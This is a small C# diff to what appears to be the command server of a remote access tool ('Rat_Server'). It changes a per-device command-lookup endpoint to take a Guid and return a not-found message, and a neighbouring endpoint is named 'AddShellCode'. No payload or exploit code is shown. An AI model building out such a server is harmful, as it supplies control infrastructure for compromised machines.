@@ -35,14 +35,14 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetDeviceCommands/{deviceId}")]
-        public ActionResult<List<DeviceCommandDto>> GetDeviceCommands(string deviceId)
+        public ActionResult<List<DeviceCommandDto>> GetDeviceCommands(Guid deviceId)
         {
-            if (_context.Devices.Find(new Guid(deviceId)) == null)
+            if (_context.Devices.Find(deviceId) == null)
             {
-                return StatusCode(StatusCodes.Status400BadRequest);
+                return NotFound("No Device with the corresponding deviceId was found");
             }
 
-            return Ok(_context.Commands.Where(q => q.DevicedHwid == new Guid(deviceId)).ToList());
+            return Ok(_context.Commands.Where(q => q.DevicedHwid == deviceId).ToList());
         }
 
         [HttpPost("AddShellCode")]
